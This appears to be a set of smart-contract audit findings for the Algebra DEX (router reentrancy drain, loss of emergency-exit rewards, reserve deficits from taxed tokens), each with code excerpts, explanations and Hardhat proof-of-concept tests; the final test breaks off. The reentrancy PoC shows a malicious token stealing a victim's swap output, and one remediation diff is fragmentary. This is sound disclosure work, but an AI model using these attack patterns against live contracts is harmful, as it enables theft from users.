                ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                : limitSqrtPrice,
            abi.encode(data)
        );

        return uint256(-(zeroToOne ? amount1 : amount0));
    }

    /// @inheritdoc ISwapRouter
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
        amountOut = exactInputInternal(
            params.amountIn,
            params.recipient,
            params.limitSqrtPrice,
            SwapCallbackData({path: abi.encodePacked(params.tokenIn, params.deployer, params.tokenOut), payer: msg.sender})
        );
        require(amountOut >= params.amountOutMinimum, 'Too little received');
    }
```

#### Lines 54-67 — _Payment performs an external token transferFrom while router-held balances remain accessible._

```
    function pay(address token, address payer, address recipient, uint256 value) internal {
        if (token == WNativeToken && address(this).balance >= value) {
            // pay with WNativeToken
            // "address(this).balance >= value" may unexpectedly become false (including due to frontrun)
            // so this function should be accompanied by a `refundNativeToken` in multicall to avoid potential loss of tokens
            IWNativeToken(WNativeToken).deposit{value: value}(); // wrap only what is needed to pay
            IWNativeToken(WNativeToken).transfer(recipient, value);
        } else if (payer == address(this)) {
            // pay with tokens already in the contract (for the exact input multihop case)
            TransferHelper.safeTransfer(token, recipient, value);
        } else {
            // pull payment
            TransferHelper.safeTransferFrom(token, payer, recipient, value);
        }
```
## Description

A token contract can reenter the router during the payment callback while swap output is already held by the router. For an exact-input swap whose recipient is `address(0)`, the pool transfers the output to the router before the router invokes the input token's `transferFrom`; a malicious input token can use that external call to invoke the public `sweepToken()` or `unwrapWNativeToken()` and redirect the output. The outer swap computes `amountOut` from the pool's return values and checks only the declared minimum, not whether the router still owns the output, so a partial theft that leaves the minimum balance succeeds. The same sequence applies to a multicall that intends to settle router-custodied output after the swap.
## Root cause

The router exposes balance-draining settlement functions without a reentrancy guard or operation-scoped ownership, while swap output is temporarily held at the router before an untrusted token payment call completes. Swap success is validated from pool deltas rather than from the post-callback balance delivered to the intended user.
## Impact

A user can receive less than the pool-produced output, or no output when the final settlement minimum is zero, while the malicious token's reentrant code receives the stolen output. The loss is conditional on using router custody (`recipient == address(0)`) and an ERC-20/token implementation capable of reentry, but no router lock or settlement ownership check blocks the path.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';

import completeFixture from './shared/completeFixture';
import { FeeAmount, TICK_SPACINGS } from './shared/constants';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expect } from './shared/expect';
import { getMaxTick, getMinTick } from './shared/ticks';

async function sorted(a: string, b: string): Promise<[string, string]> {
  return a.toLowerCase() < b.toLowerCase() ? [a, b] : [b, a];
}

describe('PoC: reentrant token drains router-custodied swap output', function () {
  this.timeout(40_000);

  it('reenters sweepToken during exactInputSingle payment and steals output held for recipient address(0)', async () => {
    const [owner, trader, thief] = await ethers.getSigners();
    const { factory, nft, router, tokens } = await loadFixture(completeFixture);
    const outputToken = tokens[0];
    const outputTokenAddress = await outputToken.getAddress();
    const routerAddress = await router.getAddress();

    const ReentrantToken = await ethers.getContractFactory('ReentrantSweepToken');
    const inputToken = await ReentrantToken.deploy(MaxUint256 / 4n);
    const inputTokenAddress = await inputToken.getAddress();

    const [token0Address, token1Address] = await sorted(inputTokenAddress, outputTokenAddress);
    const tickLower = getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]);
    const tickUpper = getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM]);

    await nft.createAndInitializePoolIfNecessary(token0Address, token1Address, encodePriceSqrt(1, 1));
    const poolAddress = await factory.poolByPair(token0Address, token1Address);
    expect(poolAddress).to.not.equal(ZeroAddress);

    await inputToken.approve(await nft.getAddress(), MaxUint256);
    await outputToken.approve(await nft.getAddress(), MaxUint256);
    await nft.mint({
      token0: token0Address,
      token1: token1Address,
      deployer: ZeroAddress,
      tickLower,
      tickUpper,
      amount0Desired: 1_000_000,
      amount1Desired: 1_000_000,
      amount0Min: 0,
      amount1Min: 0,
      recipient: owner.address,
      deadline: 1,
    });

    await inputToken.transfer(trader.address, 10_000n);
    await inputToken.connect(trader).approve(routerAddress, MaxUint256);
    await inputToken.configureAttack(routerAddress, outputTokenAddress, thief.address);
    await inputToken.setAttackEnabled(true);

    const traderInputBefore = await inputToken.balanceOf(trader.address);
    const traderOutputBefore = await outputToken.balanceOf(trader.address);
    const thiefOutputBefore = await outputToken.balanceOf(thief.address);
    const routerOutputBefore = await outputToken.balanceOf(routerAddress);
    expect(routerOutputBefore).to.equal(0n);

    await router.connect(trader).exactInputSingle({
      tokenIn: inputTokenAddress,
      tokenOut: outputTokenAddress,
      deployer: ZeroAddress,
      fee: FeeAmount.MEDIUM,
      limitSqrtPrice: 0,
      recipient: ZeroAddress,
      deadline: 1,
      amountIn: 1_000,
      amountOutMinimum: 1,
    });

    const thiefStolenOutput = (await outputToken.balanceOf(thief.address)) - thiefOutputBefore;
    expect(await inputToken.balanceOf(trader.address)).to.equal(traderInputBefore - 1_000n);
    expect(await outputToken.balanceOf(trader.address)).to.equal(traderOutputBefore);
    expect(await outputToken.balanceOf(routerAddress)).to.equal(0n);
    expect(thiefStolenOutput).to.be.gt(0n);
  });
});
```

# Reentrant token can drain router-custodied output
**#214096**
- Severity: High
- Validity: Unreviewed
## Source locations
### `src/core/contracts/AlgebraPool.sol`
#### Lines 229-241 — _Pool transfers swap output before invoking the callback that ultimately performs token payment._

```
      if (zeroToOne) {
        unchecked {
          if (amount1 < 0) _transfer(token1, recipient, uint256(-amount1)); // amount1 cannot be > 0
        }
        _swapCallback(amount0, amount1, data); // callback to get tokens from the msg.sender
        if (balance0Before + uint256(amount0) > _balanceToken0()) revert insufficientInputAmount();
        _changeReserves(amount0, amount1, communityFee, 0); // reflect reserve change and pay communityFee
      } else {
        unchecked {
          if (amount0 < 0) _transfer(token0, recipient, uint256(-amount0)); // amount0 cannot be > 0
        }
        _swapCallback(amount0, amount1, data); // callback to get tokens from the msg.sender
        if (balance1Before + uint256(amount1) > _balanceToken1()) revert insufficientInputAmount();
```
## Description

A token contract can reenter the router during the payment callback while swap output is already held by the router. For an exact-input swap whose recipient is `address(0)`, the pool transfers the output to the router before the router invokes the input token's `transferFrom`; a malicious input token can use that external call to invoke the public `sweepToken()` or `unwrapWNativeToken()` and redirect the output. The outer swap computes `amountOut` from the pool's return values and checks only the declared minimum, not whether the router still owns the output, so a partial theft that leaves the minimum balance succeeds. The same sequence applies to a multicall that intends to settle router-custodied output after the swap.
## Root cause

The router exposes balance-draining settlement functions without a reentrancy guard or operation-scoped ownership, while swap output is temporarily held at the router before an untrusted token payment call completes. Swap success is validated from pool deltas rather than from the post-callback balance delivered to the intended user.
## Impact

A user can receive less than the pool-produced output, or no output when the final settlement minimum is zero, while the malicious token's reentrant code receives the stolen output. The loss is conditional on using router custody (`recipient == address(0)`) and an ERC-20/token implementation capable of reentry, but no router lock or settlement ownership check blocks the path.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import completeFixture from './shared/completeFixture';
import { FeeAmount, TICK_SPACINGS } from './shared/constants';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expandTo18Decimals } from './shared/expandTo18Decimals';
import { expect } from './shared/expect';
import { getMaxTick, getMinTick } from './shared/ticks';

describe('PoC: reentrant token drains router-custodied exact-input output', function () {
  this.timeout(40000);

  it('malicious input token sweeps output from the router before multicall settlement', async () => {
    const [liquidityProvider, victim, attacker] = await ethers.getSigners();
    const { factory, router, nft } = await loadFixture(completeFixture);

    const outputFactory = await ethers.getContractFactory('TestERC20');
    const outputToken = await outputFactory.deploy(MaxUint256 / 2n);
    const maliciousFactory = await ethers.getContractFactory('MaliciousReentrantERC20');
    const maliciousToken = await maliciousFactory.deploy(MaxUint256 / 2n);

    const outputAddress = await outputToken.getAddress();
    const maliciousAddress = await maliciousToken.getAddress();
    const routerAddress = await router.getAddress();

    const [token0, token1] = maliciousAddress.toLowerCase() < outputAddress.toLowerCase()
      ? [maliciousAddress, outputAddress]
      : [outputAddress, maliciousAddress];

    await nft.createAndInitializePoolIfNecessary(token0, token1, encodePriceSqrt(1, 1));
    await maliciousToken.approve(nft, MaxUint256);
    await outputToken.approve(nft, MaxUint256);
    await nft.mint({
      token0,
      token1,
      deployer: ZeroAddress,
      tickLower: getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]),
      tickUpper: getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM]),
      recipient: liquidityProvider.address,
      amount0Desired: 1_000_000,
      amount1Desired: 1_000_000,
      amount0Min: 0,
      amount1Min: 0,
      deadline: 1,
    });

    await maliciousToken.transfer(victim.address, expandTo18Decimals(1_000));
    await maliciousToken.connect(victim).approve(router, MaxUint256);
    await maliciousToken.configureAttack(routerAddress, outputAddress, attacker.address, true);

    const pool = await factory.poolByPair(maliciousAddress, outputAddress);
    const poolOutputBefore = await outputToken.balanceOf(pool);
    const victimOutputBefore = await outputToken.balanceOf(victim.address);
    const attackerOutputBefore = await outputToken.balanceOf(attacker.address);

    const swapData = router.interface.encodeFunctionData('exactInputSingle', [{
      tokenIn: maliciousAddress,
      tokenOut: outputAddress,
      deployer: ZeroAddress,
      recipient: ZeroAddress,
      deadline: 1,
      amountIn: 1_000,
      amountOutMinimum: 1,
      limitSqrtPrice: 0,
    }]);
    const victimSettlementData = router.interface.encodeFunctionData('sweepToken', [outputAddress, 0, victim.address]);

    await router.connect(victim).multicall([swapData, victimSettlementData]);

    const poolOutputAfter = await outputToken.balanceOf(pool);
    const victimOutputAfter = await outputToken.balanceOf(victim.address);
    const attackerOutputAfter = await outputToken.balanceOf(attacker.address);
    const routerOutputAfter = await outputToken.balanceOf(routerAddress);

    const poolProducedOutput = poolOutputBefore - poolOutputAfter;
    const attackerStolenOutput = attackerOutputAfter - attackerOutputBefore;

    expect(poolProducedOutput).to.be.gt(0n);
    expect(attackerStolenOutput).to.eq(poolProducedOutput);
    expect(victimOutputAfter).to.eq(victimOutputBefore);
    expect(routerOutputAfter).to.eq(0n);
  });
});
```

## Remediation
### Explanation

Adds a router swap-operation lock and blocks all balance-draining settlement variants while a swap callback is active. The lock ends when each swap call returns, preserving intended multicall settlement immediately after the swap while preventing malicious token reentry from sweeping router-custodied output.

```diff
     function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external override {
         require(amount0Delta > 0 || amount1Delta > 0, 'Zero liquidity swap'); // swaps entirely within 0-liquidity regions are not supported
         SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));
         (address tokenIn, address deployer, address tokenOut) = data.path.decodeFirstPool();
         CallbackValidation.verifyCallback(factory, deployer, tokenIn, tokenOut);
 
         (bool isExactInput, uint256 amountToPay) = amount0Delta > 0
             ? (tokenIn < tokenOut, uint256(amount0Delta))
             : (tokenOut < tokenIn, uint256(amount1Delta));
         if (isExactInput) {
             pay(tokenIn, data.payer, msg.sender, amountToPay);

                 ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                 : limitSqrtPrice,
             abi.encode(data)
         );
 
         return uint256(-(zeroToOne ? amount1 : amount0));

             params.amountIn = exactInputInternal(
                 params.amountIn,
                 hasMultiplePools ? address(this) : params.recipient, // for intermediate swaps, this contract custodies

         bool zeroToOne = params.tokenIn < params.tokenOut;

             zeroToOne,

                 ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                 : limitSqrtPrice,
             abi.encode(data)
         );

         (amountIn, amountOutReceived) = zeroToOne
             ? (uint256(amount0Delta), uint256(-amount1Delta))
             : (uint256(amount1Delta), uint256(-amount0Delta));

             params.recipient,
             params.limitSqrtPrice,

         exactOutputInternal(
             params.amountOut,
             params.recipient,
```

# Emergency exit erases accrued farm rewards
**#214160**
- Severity: High
- Validity: Unreviewed
## Source locations
### `src/farming/contracts/farmings/AlgebraEternalFarming.sol` (4 locations)
#### Lines 260-272 — _Emergency mode skips reward calculation and deletes the farm._

```
  function exitFarming(IncentiveKey memory key, uint256 tokenId, address _owner) external override onlyFarmingCenter {
    bytes32 incentiveId = IncentiveId.compute(key);
    Farm memory farm = _getFarm(tokenId, incentiveId);

    uint256 reward;
    uint256 bonusReward;
    if (!isEmergencyWithdrawActivated) {
```

```
  function _updatePosition(
    Farm memory farm,
    IncentiveKey memory key,
    bytes32 incentiveId,
    address _owner,
    int128 liquidityDelta
  ) internal returns (uint256 reward, uint256 bonusReward) {
    Incentive storage incentive = incentives[incentiveId];
    IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);

    // pool can "detach" by itself or manually
    int24 tick = _isIncentiveDeactivated(incentive) ? virtualPool.globalTick() : _getTickInPoolAndCheckLock(key.pool);

    // update rewards, as ticks may be cleared when liquidity decreases
    _distributeRewards(virtualPool);

    (reward, bonusReward, , ) = _getNewRewardsForFarm(virtualPool, farm);

    // liquidityDelta will be nonzero.
    // If a desynchronization occurs and the current tick in the pool is incorrect from the point of view of the virtual pool,
    // the virtual pool will be deactivated automatically
    _updatePositionInVirtualPool(address(virtualPool), farm.tickLower, farm.tickUpper, liquidityDelta, tick);

    mapping(IERC20Minimal => uint256) storage rewardBalances = rewards[_owner];

      if (reward != 0) rewardBalances[key.rewardToken] += reward; // user must claim before overflow

    }
```

### `src/farming/contracts/interfaces/IAlgebraEternalFarming.sol`
#### Lines 94-99 — _Emergency mode explicitly exposes an unrestricted exit mode, making the affected path user-reachable._

```
  /// @notice Changes `isEmergencyWithdrawActivated`. Users can withdraw liquidity without any checks if activated.
  /// User cannot enter to farmings if activated.
  /// _Must_ only be used in emergency situations. Farmings may be unusable after activation.
  /// @dev only farmings administrator
  /// @param newStatus The new status of `isEmergencyWithdrawActivated`.
  function setEmergencyWithdrawStatus(bool newStatus) external;
```
## Description

Emergency mode also destroys the user’s accrued farm claim without checkpointing it. `exitFarming` computes no reward when the emergency flag is set, deletes the `Farm`, and emits `FarmEnded` with zero amounts. The normal `_updatePosition` path is what calls `_getNewRewardsForFarm` and adds the result to `rewards[_owner]`; after deletion, `collectRewards` can no longer recover the deleted position because `_getFarm` rejects zero liquidity. This creates a direct loss of rewards earned before the emergency exit.
## Root cause

The emergency branch uses a raw farm deletion instead of settling the farm’s reward-growth checkpoint before deletion. The emergency exit semantics therefore conflate bypassing normal eligibility checks with forfeiting already accrued user rewards.
## Impact

A position owner who uses the documented emergency exit can lose all reward growth accumulated since the farm’s last checkpoint. The loss is permanent for that NFT/incentive because the farm record is deleted and later collection reverts, even though the reward reserve and growth state may still reflect the accrued distribution.
## Proof of concept
### Test case

```
import { loadFixture, time } from '@nomicfoundation/hardhat-network-helpers';
import { Wallet } from 'ethers';
import { ethers } from 'hardhat';

import { algebraFixture, BNe18, expect } from './shared';
import { ActorFixture } from './shared/actors';
import { HelperCommands, incentiveResultToFarmAdapter } from './helpers';

const REWARD_AMOUNT = 100_000n;
const BONUS_REWARD_AMOUNT = 50_000n;
const REWARD_RATE = 10n;
const BONUS_REWARD_RATE = 5n;

describe('PoC: emergency farming exit erases accrued rewards', () => {
  it('deletes an active farm in emergency mode without crediting reward growth already earned by the NFT owner', async () => {
    const context = await loadFixture(algebraFixture);
    const wallets = (await ethers.getSigners()) as any as Wallet[];
    const actors = new ActorFixture(wallets, ethers.provider);
    const lp = actors.lpUser0();
    const farmingAdmin = actors.wallets[0];
    const helpers = HelperCommands.fromTestContext(context, actors, ethers.provider);

    const incentive = await helpers.createIncentiveFlow({
      rewardToken: context.rewardToken,
      bonusRewardToken: context.bonusRewardToken,
      poolAddress: context.pool01,
      nonce: 0n,
      totalReward: REWARD_AMOUNT,
      bonusReward: BONUS_REWARD_AMOUNT,
      rewardRate: REWARD_RATE,
      bonusRewardRate: BONUS_REWARD_RATE,
    });
    const incentiveKey = await incentiveResultToFarmAdapter(incentive);

    const { tokenId } = await helpers.mintDepositFarmFlow({
      lp,
      tokensToFarm: [context.token0, context.token1],
      amountsToFarm: [BNe18(10), BNe18(10)],
      ticks: [-120, 120],
      createIncentiveResult: incentive,
    });

    await time.increase(100);

    const accruedBeforeEmergency = await context.eternalFarming.getRewardInfo(incentiveKey, tokenId);
    expect(accruedBeforeEmergency.reward).to.be.gt(0n);
    expect(accruedBeforeEmergency.bonusReward).to.be.gt(0n);

    const rewardTokenAddress = await context.rewardToken.getAddress();
    const bonusRewardTokenAddress = await context.bonusRewardToken.getAddress();
    expect(await context.eternalFarming.rewards(lp.address, rewardTokenAddress)).to.equal(0n);
    expect(await context.eternalFarming.rewards(lp.address, bonusRewardTokenAddress)).to.equal(0n);

    await context.eternalFarming.connect(farmingAdmin).setEmergencyWithdrawStatus(true);
    expect(await context.eternalFarming.isEmergencyWithdrawActivated()).to.equal(true);

    // Public user-facing emergency exit: FarmingCenter.exitFarming -> AlgebraEternalFarming.exitFarming.
    await context.farmingCenter.connect(lp).exitFarming(incentiveKey, tokenId);

    // The vulnerable emergency branch deleted the farm but skipped _updatePosition, so the already-computed
    // reward growth was never moved into the user's claim ledger.
    expect(await context.eternalFarming.rewards(lp.address, rewardTokenAddress)).to.equal(0n);
    expect(await context.eternalFarming.rewards(lp.address, bonusRewardTokenAddress)).to.equal(0n);

    const rewardBalanceBeforeClaim = await context.rewardToken.balanceOf(lp.address);
    const bonusBalanceBeforeClaim = await context.bonusRewardToken.balanceOf(lp.address);
    await context.farmingCenter.connect(lp).claimReward(context.rewardToken, lp.address, 0);
    await context.farmingCenter.connect(lp).claimReward(context.bonusRewardToken, lp.address, 0);
    expect(await context.rewardToken.balanceOf(lp.address)).to.equal(rewardBalanceBeforeClaim);
    expect(await context.bonusRewardToken.balanceOf(lp.address)).to.equal(bonusBalanceBeforeClaim);

    await expect(context.farmingCenter.connect(lp).collectRewards(incentiveKey, tokenId)).to.be.revertedWithCustomError(
      context.eternalFarming,
      'farmDoesNotExist'
    );
  });
});
```

### Considerations

PoC executed in the Hardhat unit harness `unit:cryptoalgebra-integral-farming` and passed with `npx hardhat test test/Poc.spec.ts`. It proves the loss path for an active eternal farming incentive with one farmed NFT: real `FarmingCenter.exitFarming` calls real `AlgebraEternalFarming.exitFarming` in emergency mode, the farm is deleted, accrued nonzero `getRewardInfo` rewards are not credited to `rewards[owner]`, subsequent public claim transfers nothing, and later collection reverts because the farm no longer exists. The test does not quantify multi-user reward redistribution/reserve side effects; it isolates the reported permanent loss of the exiting NFT owner's already accrued claim.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Emergency exits now distribute pending virtual-pool rewards and credit the farm's accrued reward-growth delta to the owner's claim ledger before deleting the farm, while still bypassing normal pool eligibility and virtual-liquidity update checks.
### Patch

```diff
diff --git a/src/farming/contracts/farmings/AlgebraEternalFarming.sol b/src/farming/contracts/farmings/AlgebraEternalFarming.sol
--- a/src/farming/contracts/farmings/AlgebraEternalFarming.sol
+++ b/src/farming/contracts/farmings/AlgebraEternalFarming.sol
@@ -1,499 +1,509 @@
 // SPDX-License-Identifier: BUSL-1.1
 pragma solidity =0.8.20;
 
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPoolDeployer.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPool.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraFactory.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IERC20Minimal.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/SafeCast.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/FullMath.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/Constants.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/TickMath.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/LowGasSafeMath.sol';
 
 import '@cryptoalgebra/integral-periphery/contracts/libraries/TransferHelper.sol';
 
 import '@cryptoalgebra/integral-base-plugin/contracts/interfaces/plugins/IFarmingPlugin.sol';
 
 import '../interfaces/IAlgebraEternalFarming.sol';
 import '../interfaces/IAlgebraEternalVirtualPool.sol';
 import '../interfaces/IFarmingCenter.sol';
 import '../libraries/IncentiveId.sol';
 import '../libraries/NFTPositionInfo.sol';
 
 import './EternalVirtualPool.sol';
 
 /// @title Algebra Integral 1.0  eternal (v2-like) farming
 /// @notice Manages rewards and virtual pools
 contract AlgebraEternalFarming is IAlgebraEternalFarming {
   using SafeCast for int256;
   using LowGasSafeMath for uint256;
   using LowGasSafeMath for uint128;
 
   /// @notice Represents a farming incentive
   struct Incentive {
     uint128 totalReward;
     uint128 bonusReward;
     address virtualPoolAddress;
     uint24 minimalPositionWidth;
     bool deactivated;
     address pluginAddress;
   }
 
   /// @notice Represents the farm for nft
   struct Farm {
     uint128 liquidity;
     int24 tickLower;
     int24 tickUpper;
     uint256 innerRewardGrowth0;
     uint256 innerRewardGrowth1;
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   bytes32 public constant override INCENTIVE_MAKER_ROLE = keccak256('INCENTIVE_MAKER_ROLE');
   /// @inheritdoc IAlgebraEternalFarming
   bytes32 public constant override FARMINGS_ADMINISTRATOR_ROLE = keccak256('FARMINGS_ADMINISTRATOR_ROLE');
 
   /// @inheritdoc IAlgebraEternalFarming
   INonfungiblePositionManager public immutable override nonfungiblePositionManager;
 
   IAlgebraPoolDeployer private immutable deployer;
   IAlgebraFactory private immutable factory;
 
   /// @inheritdoc IAlgebraEternalFarming
   address public override farmingCenter;
 
   /// @inheritdoc IAlgebraEternalFarming
   bool public override isEmergencyWithdrawActivated;
 
   // reentrancy lock
   bool private unlocked = true;
 
   /// @dev bytes32 incentiveId refers to the return value of IncentiveId.compute
   /// @inheritdoc IAlgebraEternalFarming
   mapping(bytes32 incentiveId => Incentive incentive) public override incentives;
 
   /// @dev farms[tokenId][incentiveHash] => Farm
   /// @inheritdoc IAlgebraEternalFarming
   mapping(uint256 tokenId => mapping(bytes32 incentiveId => Farm farm)) public override farms;
 
   /// @inheritdoc IAlgebraEternalFarming
   uint256 public numOfIncentives;
 
   /// @dev rewards[owner][rewardToken] => uint256
   /// @inheritdoc IAlgebraEternalFarming
   mapping(address owner => mapping(IERC20Minimal rewardToken => uint256 rewardAmount)) public override rewards;
 
   modifier onlyIncentiveMaker() {
     _checkHasRole(INCENTIVE_MAKER_ROLE);
     _;
   }
 
   modifier onlyAdministrator() {
     _checkHasRole(FARMINGS_ADMINISTRATOR_ROLE);
     _;
   }
 
   modifier onlyFarmingCenter() {
     _checkIsFarmingCenter();
     _;
   }
 
   /// @param _deployer pool deployer contract address
   /// @param _nonfungiblePositionManager the NFT position manager contract address
   constructor(IAlgebraPoolDeployer _deployer, INonfungiblePositionManager _nonfungiblePositionManager) {
     (deployer, nonfungiblePositionManager) = (_deployer, _nonfungiblePositionManager);
     factory = IAlgebraFactory(_nonfungiblePositionManager.factory());
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function isIncentiveDeactivated(bytes32 incentiveId) external view override returns (bool res) {
     return _isIncentiveDeactivated(incentives[incentiveId]);
   }
 
   function _checkIsFarmingCenter() internal view {
     require(msg.sender == farmingCenter);
   }
 
   function _checkHasRole(bytes32 role) internal view {
     require(factory.hasRoleOrOwner(role, msg.sender));
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function createEternalFarming(
     IncentiveKey memory key,
     IncentiveParams memory params,
     address plugin
   ) external override onlyIncentiveMaker returns (address virtualPool) {
     address connectedPlugin = key.pool.plugin();
     if (connectedPlugin != plugin || connectedPlugin == address(0)) revert pluginNotConnected();
     if (IFarmingPlugin(connectedPlugin).incentive() != address(0)) revert anotherFarmingIsActive();
 
     virtualPool = address(new EternalVirtualPool(address(this), connectedPlugin));
     IFarmingCenter(farmingCenter).connectVirtualPoolToPlugin(virtualPool, IFarmingPlugin(connectedPlugin));
 
     key.nonce = numOfIncentives++;
     bytes32 incentiveId = IncentiveId.compute(key);
     Incentive storage newIncentive = incentives[incentiveId];
 
     (params.reward, params.bonusReward) = _receiveRewards(key, params.reward, params.bonusReward, newIncentive);
     if (params.reward == 0) revert zeroRewardAmount();
 
     unchecked {
       if (int256(uint256(params.minimalPositionWidth)) > (int256(TickMath.MAX_TICK) - int256(TickMath.MIN_TICK)))
         revert minimalPositionWidthTooWide();
     }
     newIncentive.virtualPoolAddress = virtualPool;
     newIncentive.minimalPositionWidth = params.minimalPositionWidth;
     newIncentive.pluginAddress = connectedPlugin;
 
     emit EternalFarmingCreated(
       key.rewardToken,
       key.bonusRewardToken,
       key.pool,
       virtualPool,
       key.nonce,
       params.reward,
       params.bonusReward,
       params.minimalPositionWidth
     );
 
     _addRewards(IAlgebraEternalVirtualPool(virtualPool), params.reward, params.bonusReward, incentiveId);
     _setRewardRates(IAlgebraEternalVirtualPool(virtualPool), params.rewardRate, params.bonusRewardRate, incentiveId);
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function deactivateIncentive(IncentiveKey memory key) external override onlyIncentiveMaker {
     (bytes32 incentiveId, Incentive storage incentive) = _getExistingIncentiveByKey(key);
     // if the virtual pool is deactivated automatically, it is still possible to correctly deactivate it manually
     if (incentive.deactivated) revert incentiveStopped();
 
     IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);
     IFarmingPlugin plugin = IFarmingPlugin(incentive.pluginAddress);
 
     incentive.deactivated = true;
     virtualPool.deactivate();
 
     (uint128 rewardRate0, uint128 rewardRate1) = virtualPool.rewardRates();
     if (rewardRate0 | rewardRate1 != 0) _setRewardRates(virtualPool, 0, 0, incentiveId);
 
     IFarmingCenter(farmingCenter).disconnectVirtualPoolFromPlugin(address(virtualPool), plugin);
 
     emit IncentiveDeactivated(incentiveId);
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function decreaseRewardsAmount(IncentiveKey memory key, uint128 rewardAmount, uint128 bonusRewardAmount) external override onlyAdministrator {
     (bytes32 incentiveId, Incentive storage incentive) = _getExistingIncentiveByKey(key);
     IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);
 
     _distributeRewards(virtualPool);
     (uint128 rewardReserve0, uint128 rewardReserve1) = virtualPool.rewardReserves();
     if (rewardAmount > rewardReserve0) rewardAmount = rewardReserve0;
     if (rewardAmount >= incentive.totalReward) rewardAmount = incentive.totalReward - 1; // to not trigger 'non-existent incentive'
     incentive.totalReward = incentive.totalReward - rewardAmount;
 
     if (bonusRewardAmount > rewardReserve1) bonusRewardAmount = rewardReserve1;
     incentive.bonusReward = incentive.bonusReward - bonusRewardAmount;
 
     virtualPool.decreaseRewards(rewardAmount, bonusRewardAmount);
```

# Reserve Deficits From Taxed Transfers
**#214482**
- Severity: High
- Validity: Unreviewed

## Description

`_updateReserves` reconciles only positive balance deltas: when an observed balance is below its tracked reserve, it leaves the reserve unchanged. In contrast, `AlgebraPool` performs outbound transfers and then adjusts reserves by nominal requested amounts, and `_transfer` validates only the token call result rather than the actual balance delta. A fee-on-transfer token can therefore deduct more from the pool than the nominal output or collected fee, while a downward rebase can reduce the pool balance without any pool call; both leave `reserve0` or `reserve1` greater than the real balance. The stale excess is ignored on every later `_updateReserves`, so the discrepancy accumulates until an outbound transfer or flash repayment requires tokens that the pool no longer holds.
## Root cause

Reserve accounting assumes that an ERC-20 transfer of `amount` decreases the pool balance by exactly `amount` and that balances never decrease outside pool accounting. The reconciliation helper intentionally handles only positive donations and never repairs a negative balance-versus-reserve difference.
## Impact

A sender-tax token causes recipients to receive less than the amount recorded by the pool and can eventually make output transfers, fee collection, or flash operations revert despite the tracked reserve appearing sufficient. A downward rebase can produce the same deficit without a caller transaction, freezing the affected token leg and potentially preventing LPs from collecting balances until someone supplies enough replacement tokens.
## Proof of concept
### Test case

```
import { ethers } from 'hardhat';
import { MaxUint256 } from 'ethers';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from './shared/expect';

import { poolFixture } from './shared/fixtures';
import { encodePriceSqrt, expandTo18Decimals, getMaxTick, getMinTick, MAX_SQRT_RATIO, MIN_SQRT_RATIO } from './shared/utilities';

describe('PoC: taxed transfer reserve deficit', () => {
  it('keeps reserves above real balances after taxed pool outflows and underpays the recipient', async () => {
    const [wallet, recipient] = await (ethers as any).getSigners();
    const { createPool, swapTargetCallee } = await loadFixture(poolFixture);

    const initialSupply = expandTo18Decimals(1_000_000);
    const TaxedToken = await ethers.getContractFactory('SenderAndRecipientTaxToken');
    const NormalToken = await ethers.getContractFactory('TestERC20');
    const taxed = await TaxedToken.deploy(initialSupply, 1_000, 500); // 10% sender tax, 5% recipient tax
    const normal = await NormalToken.deploy(initialSupply);

    const pool = await createPool(taxed as any, normal as any);
    await pool.initialize(encodePriceSqrt(1, 1));

    const taxedAddress = (await taxed.getAddress()).toLowerCase();
    const taxedIsToken0 = (await pool.token0()).toLowerCase() === taxedAddress;
    const minTick = getMinTick(60);
    const maxTick = getMaxTick(60);

    await taxed.approve(swapTargetCallee, MaxUint256);
    await normal.approve(swapTargetCallee, MaxUint256);
    await swapTargetCallee.mint(pool, wallet.address, minTick, maxTick, expandTo18Decimals(1_000));

    const reserveAndBalance = async () => {
      const [reserve0, reserve1] = await pool.getReserves();
      const reserve = taxedIsToken0 ? reserve0 : reserve1;
      const balance = await taxed.balanceOf(pool);
      return { reserve, balance, gap: reserve - balance };
    };

    const before = await reserveAndBalance();
    expect(before.gap).to.eq(0n);

    const swapIn = expandTo18Decimals(1);
    const recipientBefore = await taxed.balanceOf(recipient.address);
    const tx = taxedIsToken0
